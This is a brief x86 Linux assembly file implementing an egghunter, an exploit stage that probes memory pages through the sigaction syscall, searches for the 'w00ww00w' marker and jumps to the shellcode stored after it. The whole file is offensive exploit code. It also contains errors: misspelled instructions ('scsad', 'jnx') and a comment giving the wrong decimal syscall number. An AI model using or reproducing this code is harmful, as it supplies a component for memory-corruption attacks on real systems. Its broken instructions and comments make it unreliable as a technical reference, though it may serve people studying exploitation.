;EggHunter Using sigaction syscall

global _start:

section .text
_start:

next_page:
	or cx, 0xfff		; set cx to 4095 ; Page size in x86 Linux is 4096 =>0x1000 => has null bytes so 4096-1=4095=> 0xfff

next_addr:
	inc ecx  		; increment to 4096
    	mov eax, 0x43  		; syscall for sigaction is 17. Hex is 0x43
    	int 0x80 		; execute sigaction and checks the address in ecx is valid or not
    	cmp al, 0xf2    	; checks for EFAULT. If EFAULT occures zeroflag is set.
    	jz next_page		; If Zeroflag is set jump to next page
    	mov eax, 0x77303077 	; FirstHalf of Egg => w00w(4 bytes) | Hex => 0x77303077 | CompleteEgg => w00ww00w(8 bytes) 
  	mov edi, ecx    	; move address from ecx to edi (the memory address to be compared with our EGG)
    	scsad     		; if edi==eax the zero flag is set and edi is incremented by 4 bytes 
    	jnz next_addr    	; if zero flag is NOT set, jump to next_addr
    	scsad    		; check for other half of EGG. if edi==eax the zero flag is set and edi is incremented by 4 bytes
    	jnx next_addr    	; if zero flag is NOT set, jump to next_addr
    	jmp edi    		; jmp to our shellcode that is present right after the EGG.
